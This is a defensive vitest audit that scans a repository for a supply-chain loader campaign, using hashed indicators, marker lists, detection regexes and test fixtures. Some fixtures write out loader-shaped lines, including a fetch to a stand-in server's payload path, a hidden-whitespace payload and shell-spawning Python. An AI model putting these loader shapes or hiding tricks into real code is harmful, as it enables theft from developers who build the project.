/** @vitest-environment node */
/**
 * Repository-poisoning audit — fails if a tracked file carries the shape of a
 * worm-injected loader.
 *
 * WHY. The PolinRider campaign (reported 2026-11-26; 7,609 GitHub repositories)
 * uses a developer's stolen GitHub token to rewrite a commit they already made —
 * same author, message and date — and folds a loader into it. The loader hides
 * after hundreds of spaces at the end of a build-config line, in a Python file
 * that runs on import, in a fake font file, or in an editor auto-run task. It
 * reads its server address from a blockchain wallet, then downloads and runs a
 * stealer on whoever builds the project. Review does not catch it: the diff
 * looks like the developer's own commit and the payload is off-screen.
 *
 * WHERE IT RUNS. In the node pool (needs git + fs), registered in
 * scripts/vitest-node-suites.mjs so `npm test` collects it (the required
 * `build-and-test` check), and listed in `audit:oss-safety` (the required
 * `File hygiene check`). Both checks report matches before merge.
 *
 * WHAT IS DURABLE. The published wallets and server addresses rotate — treat
 * that list as a tripwire for the known waves only. The STRUCTURAL rules (hidden
 * code after whitespace, escape-obfuscated strings, auto-run files, fake fonts,
 * lockfile sources) describe how the loader must be shaped to work, and are what
 * should catch the next wave. This is a tripwire, not a proof: a determined
 * author who has read this file can still split or re-encode a payload.
 *
 * Wallets and addresses are stored as SHA-256 of the lowercased token, never in
 * the clear: the repo does not have to carry live malware infrastructure
 * strings, and the list cannot match itself.
 *
 * IF IT FIRES ON A LEGITIMATE FILE. Prose about the campaign belongs in a `.md`
 * file, which the indicator rules do not read. Anything else that must name an
 * indicator goes in `INDICATOR_ALLOWLIST` with a reason — a reviewed, visible
 * line, never a widened rule.
 *
 * File discovery is `git ls-files` — nested worktrees are never read.
 */
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { lstatSync, mkdtempSync, readFileSync, readlinkSync, rmSync, unlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { posix } from 'node:path';
import { describe, expect, it } from 'vitest';

const REPO_ROOT = process.cwd();
const SELF = 'test/audits/supply-chain-poisoning.audit.test.ts';

/** Non-markdown paths allowed to name a campaign indicator. Each needs a reason. */
const INDICATOR_ALLOWLIST: readonly string[] = [SELF]; // Contains the marker definitions and their positive controls.

const sha256 = (value: string): string => createHash('sha256').update(value).digest('hex');

/** SHA-256 of lowercased 40-hex Ethereum addresses used by the campaign. */
const WALLET_HASHES = new Set([
	'2dcd2a6b3f9971bce501b6125d062ba47b3310c3b542f42a7733c3af31304792',
	'0ef1ef52b1041e971be158cecf880cda6d49b8b37a6ccca8a939afc93a7787c8',
	'f3c17fe4d954284230f96ba48b1b7bb6465daf61bec68272cab05fc29f1ad453',
	'0c402d31e59836f29fed39c75759629bc9955cbe3365f4a6f94fe02f2a5f240f',
	'37a1eb91521fac92b81e66a6d69e523317df89507c2c3f84979ba96ffce013f4',
	'bb9edfca117ede340e6e797019710cf2aa0e850b9c4a13d254e2ec91c63c9f19',
	'6f8c6536e2b06ee9024fd099098b982f7b06c8ab35dad100b8d5fe6076fb930e',
	'eec55b657251796cfa019910937acd0bdec6acfc3f768972adfcce384fb8a1dd',
	'e9af0f1f87a4df7937d67e444cab83837a5fb9566fff0c952a597ef452a0cded',
]);

/** SHA-256 of the campaign's command-server IPv4 addresses. */
const IP_HASHES = new Set([
	'd3c64da22417f01f7778ab1a104f66430d84e1549b5f8c1b0ac217459a7078ee',
	'295f37fb032839bc73d0f98f4ad300d2285eba719cd583f6e06d7ced27315fe1',
	'4550c7046ad125c63bec14c6306c72fd9b5169ab6f95f5e3c8608459a8a35471',
	'6bbf330e1c19c06f7bcfa1d09a8275585858928786f67918c121be364e4f3ce0',
	'07fe79b99f257088649459c5a7fafc96d67daafc9637108b4097190966ed4b36',
	'2247bdf614491f385bb4867df1d522b7586a28863629a2106393d8d89353439c',
	'1ca8bd3eeb3b92d25d7221ab86cc01be8cc1a6afad61f3d4da693d771f183e58',
	'b5d90b6b218e962af78703c6f4792151fdc28ea680086c2cc6f0808a99fa4b33',
	'46613065a4182d3636ea7fcfe01f0da715faf7c93ad2c1ccdeb1495cde3cc6fc',
	'0efa1ae407e889d23a442daa61bfafbbce957b11081f821412568bd555e0baa0',
	'645139b371111c6351172c0ec85096332485f0ad42cb9e01c0ca6c3621759207',
]);

/** SHA-256 (case-sensitive) of the campaign's TRON addresses. */
const TRON_HASHES = new Set([
	'cec45105a1177d2948390aaabffcd4005cd5b6b658e9f3ed52feb78b2a34f035',
	'5e7168eb4f6c0afa0c616fadb2f6e7544a184d55938d0df7f18f61099322ae40',
	'da8cac99f23177a049f5d5bb43ea3eaddf9dc0fe756081aed5ecb090141fbaaa',
	'b5ca3a4075650aab6f3e91ed091bd784000264d97175e35059e624b1af44c688',
	'f9df600037b04a75c0371238608d22b5281027f2eec0f28c22f00977ed235124',
	'ccca7c1ed86f8414b899c8329f40e39833c3cbab544355692709fed65c52d543',
]);

/**
 * Plain-text markers, matched case-insensitively. Loader signatures, the
 * payload paths, the Ethereum RPC hosts the loader calls (legitimate services —
 * but nothing in this repo has a reason to call one), the fake hiring sites, and
 * the npm packages the campaign hijacked.
 */
const TEXT_MARKERS = [
	'helloipbot',
	'68656c6c6f6970626f742121',
	'/0x/cls',
	'/0x/ls',
	'_$_1e42',
	'rmcej%otb%',
	'cot%3t=shtp',
	'global.r=require',
	"global['!']",
	"global['_v']",
	'1rpc.io',
	'eth.drpc.org',
	'ethereum-rpc.publicnode.com',
	'eth-mainnet.public.blastapi.io',
	'eth.blockscout.com',
	'huntrole',
	'accurasofthire',
	'@adminide-stack/',
	'@pubngo-stack/',
	'@cdmbase/wiki-browser',
	'server-hemera-mongo',
	'itsa-utils',
	'itsa-jsext',
	'itsa-cli',
	'itsa-react-',
];

/**
 * Code parked off-screen: 150+ horizontal-whitespace characters (including
 * no-break and other Unicode spaces) followed by something, anywhere on a line —
 * at the end of a real line, or as "indentation" on a line of its own.
 */
const HIDDEN_AFTER_WHITESPACE = /[ \t\u00a0\u1680\u2000-\u200b\u202f\u205f\u3000]{150,}\S/;
/** One escaped character in any JS/JSON/Python spelling. */
const ESCAPE = String.raw`\\(?:u00[0-9a-fA-F]{2}|x[0-9a-fA-F]{2}|u\{0*[0-9a-fA-F]{1,2}\})`;
const ESCAPE_RUN = new RegExp(`(?:${ESCAPE}){8,}`, 'g');
const ESCAPE_ONE = /\\(?:u00([0-9a-fA-F]{2})|x([0-9a-fA-F]{2})|u\{0*([0-9a-fA-F]{1,2})\})/g;
/** Python files that run without being asked. */
const AUTO_RUN_PYTHON = /(^|\/)(conftest|sitecustomize|usercustomize)\.py$/;
/** What a loader needs and an ordinary fixtures file does not. */
const PYTHON_LOADER_CALL = /\b(subprocess|os\.system|os\.popen|urllib|requests|http\.client|socket|base64|__import__)\b|\b(exec|eval)\s*\(/;
/** The campaign's fake-font payload extensions. */
const FAKE_FONT_EXT = /\.(lkf|llf)$/i;
const FONT_PATH = /\.woff2?$/i;
const MARKDOWN_PATH = /\.md$/i;
const EDITOR_CONFIG_PATH = /(^|\/)\.vscode\/|\.code-workspace$/i;
/** Formats that are not source; scanned for indicators only, as raw bytes. */
const BINARY_PATH = /\.(png|jpe?g|gif|webp|avif|ico|mp4|webm|mov|pdf|docx|xlsx|pptx|zip|tgz|gz|wasm|woff2?|ttf|otf|eot|ds_store)$/i;

const decodeEscapes = (text: string): string =>
	text.replace(ESCAPE_ONE, (_, a?: string, b?: string, c?: string) => String.fromCharCode(parseInt(a ?? b ?? c ?? '0', 16)));

/** Every 40-character window of every hex run, so an address padded into longer hex still matches. */
function* hexWindows(lower: string): Generator<string> {
	for (const run of lower.match(/[0-9a-f]{40,}/g) ?? []) {
		for (let i = 0; i + 40 <= run.length; i++) yield run.slice(i, i + 40);
	}
}

const campaignHashes = { wallets: WALLET_HASHES, servers: IP_HASHES };

function indicatorFindings(text: string, hashes: typeof campaignHashes): string[] {
	const findings: string[] = [];
	const lower = text.toLowerCase();
	for (const marker of TEXT_MARKERS) {
		if (lower.includes(marker)) findings.push(`known indicator: ${marker}`);
	}
	for (const window of hexWindows(lower)) {
		if (hashes.wallets.has(sha256(window))) findings.push('known campaign wallet address');
	}
	for (const token of text.match(/(?<!\d)(?:\d{1,3}\.){3}\d{1,3}(?!\d)/g) ?? []) {
		if (hashes.servers.has(sha256(token))) findings.push('known campaign server address');
	}
	for (const token of text.match(/\bT[1-9A-HJ-NP-Za-km-z]{33}\b/g) ?? []) {
		if (TRON_HASHES.has(sha256(token))) findings.push('known campaign TRON address');
	}
	return findings;
}

/** Every reason `path` with these bytes looks poisoned. Empty = clean. */
function findPoisoning(path: string, bytes: Buffer, hashes = campaignHashes): string[] {
	const findings: string[] = [];
	if (FAKE_FONT_EXT.test(path)) findings.push('fake-font payload extension');
	if (FONT_PATH.test(path)) {
		const magic = bytes.subarray(0, 4).toString('latin1');
		if (magic !== 'wOF2' && magic !== 'wOFF') findings.push('font extension without font bytes');
	}

	const isBinary = BINARY_PATH.test(path);
	// NUL bytes are dropped, never used to skip: one NUL in a comment must not
	// switch the scan off, and UTF-16 text reads as ASCII once they are gone.
	const raw = bytes.toString(isBinary ? 'latin1' : 'utf8').replaceAll('\0', '');

	if (!isBinary) {
		if (!MARKDOWN_PATH.test(path) && HIDDEN_AFTER_WHITESPACE.test(raw)) {
			findings.push('code hidden after 150+ whitespace characters');
		}
		// Eight or more escapes that spell PRINTABLE text. A byte literal such as a
		// file magic or a test key decodes to non-printable bytes and is left alone.
		for (const run of raw.match(ESCAPE_RUN) ?? []) {
			if (/^[\x20-\x7e]+$/.test(decodeEscapes(run))) {
				findings.push('escape-obfuscated string');
				break;
			}
		}
		if (AUTO_RUN_PYTHON.test(path) && PYTHON_LOADER_CALL.test(raw)) {
			findings.push('auto-run Python file that spawns, fetches or evaluates');
		}
		if (/\.pth$/i.test(path) && /^\s*import\s/m.test(raw)) {
			findings.push('.pth file that executes an import at interpreter start');
		}
	}

	// Indicators are matched on the DECODED text, with defanged dots restored.
	const text = decodeEscapes(raw).replaceAll('[.]', '.');
	if (EDITOR_CONFIG_PATH.test(path) && /folderopen/i.test(text)) {
		findings.push('editor task that runs when the folder is opened');
	}
	if (!MARKDOWN_PATH.test(path) && !INDICATOR_ALLOWLIST.includes(path)) {
		findings.push(...indicatorFindings(text, hashes));
	}
	return [...new Set(findings)];
}

/**
 * Lockfile entries that would install from somewhere other than the npm
 * registry or a declared workspace. npm v1 nests installations under dependencies.
 * Later versions also list packages by install path.
 */
function findForeignResolutions(lockfileJson: string, workspaces: ReadonlySet<string>): string[] {
	type InstalledPackage = { resolved?: string; link?: boolean; dependencies?: Record<string, InstalledPackage> };
	const lock = JSON.parse(lockfileJson) as {
		packages?: Record<string, InstalledPackage>;
		dependencies?: Record<string, InstalledPackage>;
	};
	const offenders: string[] = [];

	function checkEntry(name: string, entry: InstalledPackage): void {
		if (typeof entry.resolved !== 'string') return;
		const allowed = entry.link === true ? workspaces.has(entry.resolved) : entry.resolved.startsWith('https://registry.npmjs.org/');
		if (!allowed) offenders.push(`${name} -> ${entry.resolved}`);
	}

	function checkDependencies(dependencies: Record<string, InstalledPackage>): void {
		for (const [name, entry] of Object.entries(dependencies)) {
			checkEntry(name, entry);
			if (entry.dependencies) checkDependencies(entry.dependencies);
		}
	}

	for (const [name, entry] of Object.entries(lock.packages ?? {})) checkEntry(name, entry);
	checkDependencies(lock.dependencies ?? {});
	return offenders;
}

function readTrackedFile(file: string, root = REPO_ROOT): Buffer {
	const path = posix.join(root, file);
	const stat = lstatSync(path, { throwIfNoEntry: false });
	// CI test shards remove the WASM-only spec after checkout. Its indexed bytes still need scanning.
	if (!stat) return execFileSync('git', ['cat-file', 'blob', `:${file}`], { cwd: root, maxBuffer: 64 * 1024 * 1024 });
	return stat.isSymbolicLink() ? readlinkSync(path, { encoding: 'buffer' }) : readFileSync(path);
}

const trackedFiles = (): string[] =>
	execFileSync('git', ['ls-files', '-z'], {
		cwd: REPO_ROOT,
		encoding: 'utf8',
		maxBuffer: 64 * 1024 * 1024,
	})
		.split('\0')
		.filter(Boolean);

describe('the scanner discriminates (known-bad vs known-good fixtures)', () => {
	const wallet = 'abcd'.repeat(10);
	const server = '192.0.2.10';
	const fixtureHashes = { wallets: new Set([sha256(wallet)]), servers: new Set([sha256(server)]) };
	const scan = (path: string, text: string): string[] => findPoisoning(path, Buffer.from(text), fixtureHashes);
	const HIDDEN = 'code hidden after 150+ whitespace characters';
	const WALLET = 'known campaign wallet address';
	const SERVER = 'known campaign server address';
	const ESCAPED = 'escape-obfuscated string';
	const escapeAs = (text: string, form: (hex: string) => string): string =>
		[...text].map((ch) => form(ch.charCodeAt(0).toString(16).padStart(2, '0'))).join('');

	it('passes ordinary source, long markdown tables, byte literals and real fonts', () => {
		expect(scan('vite.config.ts', 'export default { plugins: [] };\n')).toEqual([]);
		expect(scan('docs/table.md', `| a |${' '.repeat(300)}| b |\n`)).toEqual([]);
		expect(scan('src/commit.ts', `const sha = '${'ab12'.repeat(10)}';\n`)).toEqual([]);
		expect(scan('src/addr.ts', "const dns = ['198.51.100.20', '203.0.113.30'];\n")).toEqual([]);
		expect(scan('a.spec.ts', `const iv = '${'\\x00\\xd0\\xcf\\x11'.repeat(4)}';`)).toEqual([]);
		expect(findPoisoning('public/fonts/a.woff2', Buffer.from('wOF2\0\0\0\0'))).toEqual([]);
		expect(findPoisoning('public/fonts/fa-solid-900.woff2', Buffer.from('wOF2\0\0'))).toEqual([]);
		expect(scan('tests/conftest.py', 'import pytest\n\n@pytest.fixture\ndef db():\n    yield 1\n')).toEqual([]);
	});

	it('lets prose about the campaign live in markdown, and nowhere else unlisted', () => {
		const note = `The loader calls ethereum-rpc.publicnode.com and ${server}.`;
		expect(scan('docs/incident.md', note)).toEqual([]);
		expect(scan('seed/blog.sql', note)).toHaveLength(2);
		expect(scan(SELF, note)).toEqual([]);
		expect(scan(SELF, ' '.repeat(151) + 'x')).toContain(HIDDEN);
	});

	it('flags code hidden after whitespace: trailing, on its own line, or behind no-break spaces', () => {
		expect(scan('tailwind.config.js', `module.exports = {};${' '.repeat(500)}x();\n`)).toContain(HIDDEN);
		expect(scan('tailwind.config.js', `module.exports = {};\n${' '.repeat(500)}x();\n`)).toContain(HIDDEN);
		const mixed = `${' '.repeat(100)}\u00a0`.repeat(4);
		expect(scan('tailwind.config.js', `module.exports = {};${mixed}x();\n`)).toContain(HIDDEN);
	});

	it('is not switched off by a NUL byte, a UTF-16 encoding or a font header', () => {
		const loader = `module.exports = {};${' '.repeat(500)}fetch("http://${server}:443/0x/cls")`;
		expect(scan('tailwind.config.js', `/*\0*/${loader}`)).toEqual(expect.arrayContaining([HIDDEN, SERVER, 'known indicator: /0x/cls']));
		expect(findPoisoning('.vscode/tasks.json', Buffer.from('{"runOn":"folderOpen"}', 'utf16le'))).toContain(
			'editor task that runs when the folder is opened',
		);
		expect(scan('public/fonts/inter.woff2', `wOF2;${loader}`)).toEqual(expect.arrayContaining([SERVER, 'known indicator: /0x/cls']));
	});

	it('flags a campaign wallet in any case, padded into longer hex, or spelled in escapes', () => {
		expect(scan('a.js', `const S = "0x${wallet.toUpperCase()}";`)).toContain(WALLET);
		expect(scan('a.js', `data: "0x70a08231${'0'.repeat(24)}${wallet}"`)).toContain(WALLET);
		for (const form of [(hex: string) => `\\u00${hex}`, (hex: string) => `\\x${hex}`, (hex: string) => `\\u{${hex}}`]) {
			const findings = scan('a.js', `const S = "${escapeAs(`0x${wallet}`, form)}";`);
			expect(findings).toEqual(expect.arrayContaining([ESCAPED, WALLET]));
		}
		const alternating = [...'https://unknown.example/next-stage']
			.map((ch, i) => escapeAs(ch, (hex) => (i % 2 ? `\\x${hex}` : `\\u00${hex}`)))
			.join('');
		expect(scan('a.js', `const u = "${alternating}";`)).toContain(ESCAPED);
	});

	it('flags a campaign server address: plain, defanged, or followed by a dot', () => {
		expect(scan('a.py', `HOST = "${server}"`)).toContain(SERVER);
		expect(scan('notes.txt', server.replaceAll('.', '[.]'))).toContain(SERVER);
		expect(scan('a.js', `fetch("http://${server}.example.test/x")`)).toContain(SERVER);
	});

	it('flags loader markers, payload paths and hijacked packages', () => {
		expect(scan('a.js', 'fetch(`http://${ip}:443/0x/cls`)')).toContain('known indicator: /0x/cls');
		expect(scan('a.js', 'global.r=require;')).toContain('known indicator: global.r=require');
		expect(scan('package.json', '{"dependencies":{"@adminide-stack/utils":"1.0.0"}}')).toContain('known indicator: @adminide-stack/');
	});

	it('flags auto-run Python that spawns or fetches, folder-open tasks and fake fonts', () => {
		const py = 'import subprocess\nsubprocess.Popen(["node", "-e", js])\n';
		expect(scan('tests/conftest.py', py)).toEqual(['auto-run Python file that spawns, fetches or evaluates']);
		expect(scan('src/x.pth', 'import os; os.system("id")\n')).toHaveLength(1);
		const task = 'editor task that runs when the folder is opened';
		expect(scan('.vscode/tasks.json', '{"runOptions":{"runOn":"folderOpen"}}')).toContain(task);
		expect(scan('.vscode/tasks.json', '{"runOn":"\\u0066olderOpen"}')).toContain(task);
		expect(scan('bv.code-workspace', '{"tasks":{"runOn":"folderOpen"}}')).toContain(task);
		expect(scan('public/fonts/a.woff2', 'eval(payload)')).toEqual(['font extension without font bytes']);
		expect(scan('public/fonts/fa-solid-300.llf', 'x')).toEqual(['fake-font payload extension']);
	});

	it('reads the indexed blob when a test shard omits a tracked file from its checkout', () => {
		const root = mkdtempSync(posix.join(tmpdir(), 'bv-indexed-file-'));
		const file = 'shard-fixture.txt';
		const path = posix.join(root, file);
		try {
			execFileSync('git', ['init', '--quiet'], { cwd: root });
			writeFileSync(path, 'indexed bytes');
			execFileSync('git', ['add', '--', file], { cwd: root });
			writeFileSync(path, 'working bytes');
			expect(readTrackedFile(file, root).toString()).toBe('working bytes');
			unlinkSync(path);
			expect(readTrackedFile(file, root).toString()).toBe('indexed bytes');
		} finally {
			rmSync(root, { recursive: true, force: true });
		}
	});

	it('flags a lockfile entry resolved outside the registry and workspaces', () => {
		const lock = (entry: object): string => JSON.stringify({ packages: { 'node_modules/x': entry } });
		const workspaces = new Set(['packages/dns-checks']);
		const ok = (entry: object): void => expect(findForeignResolutions(lock(entry), workspaces)).toEqual([]);
		const bad = (json: string): void => expect(findForeignResolutions(json, workspaces)).toHaveLength(1);
		ok({ resolved: 'https://registry.npmjs.org/x/-/x-1.0.0.tgz' });
		ok({ resolved: 'packages/dns-checks', link: true });
		ok({ dependencies: { resolved: '^1.0.0' } });
		bad(lock({ resolved: 'file:vendor/x-1.0.0.tgz' }));
		bad(lock({ resolved: 'https://example.com/x.tgz' }));
		bad(lock({ resolved: 'git+ssh://git@github.com/a/b.git#abc' }));
		bad(lock({ resolved: '../outside', link: true }));
		bad(lock({ resolved: 'other/directory', link: true }));
		// No `link: true`: npm reads this as the GitHub repository evilorg/evilrepo.
		bad(lock({ resolved: 'evilorg/evilrepo' }));
		// lockfileVersion 1 keeps entries under `dependencies`, not `packages`.
		bad(
			JSON.stringify({
				lockfileVersion: 1,
				dependencies: { x: { version: '1.0.0', resolved: 'https://example.com/x.tgz' } },
			}),
		);
	});
});

describe('no tracked file is poisoned', () => {
	const files = trackedFiles();

	it('sweeps the whole tracked tree, including the build configs a loader targets', () => {
		// Floor catches a cwd/spawn collapse only; measured 1,928 on 2026-11-26.
		expect(files.length).toBeGreaterThan(1_000);
		for (const path of [SELF, 'tsup.config.ts', 'eslint.config.mjs', 'package.json', 'src/index.ts', 'packages/dns-checks/package.json']) {
			expect(files, `${path} must be in the swept set`).toContain(path);
		}
	});

	it('finds no loader shape or campaign indicator', () => {
		const offenders: string[] = [];
		for (const file of files) {
			for (const finding of findPoisoning(file, readTrackedFile(file))) offenders.push(`${file}: ${finding}`);
		}
		expect(offenders, `Possible repository poisoning — do NOT build or deploy; inspect each file:\n${offenders.join('\n')}`).toEqual([]);
		// Reads every tracked file; an explicit budget so a loaded runner cannot time it out.
	}, 120_000);

	it('every lockfile installs only from the registry or workspaces', () => {
		const lockfiles = files.filter((file) => ['package-lock.json', 'npm-shrinkwrap.json'].includes(posix.basename(file)));
		expect(lockfiles).toContain('package-lock.json');
		const manifests = files.filter((file) => posix.basename(file) === 'package.json');
		const offenders = lockfiles.flatMap((lockfile) => {
			const dir = posix.dirname(lockfile);
			const manifestFile = posix.join(dir, 'package.json');
			const manifest = manifests.includes(manifestFile) ? JSON.parse(readTrackedFile(manifestFile).toString('utf8')) : {};
			const patterns: string[] = Array.isArray(manifest.workspaces) ? manifest.workspaces : (manifest.workspaces?.packages ?? []);
			const workspaces = new Set(
				manifests
					.map((file) => posix.relative(dir, posix.dirname(file)))
					.filter((path) => path && path !== '..' && !path.startsWith('../') && patterns.some((pattern) => posix.matchesGlob(path, pattern))),
			);
			return findForeignResolutions(readTrackedFile(lockfile).toString('utf8'), workspaces).map((hit) => `${lockfile}: ${hit}`);
		});
		expect(offenders, `Unexpected install source:\n${offenders.join('\n')}`).toEqual([]);
	});
});
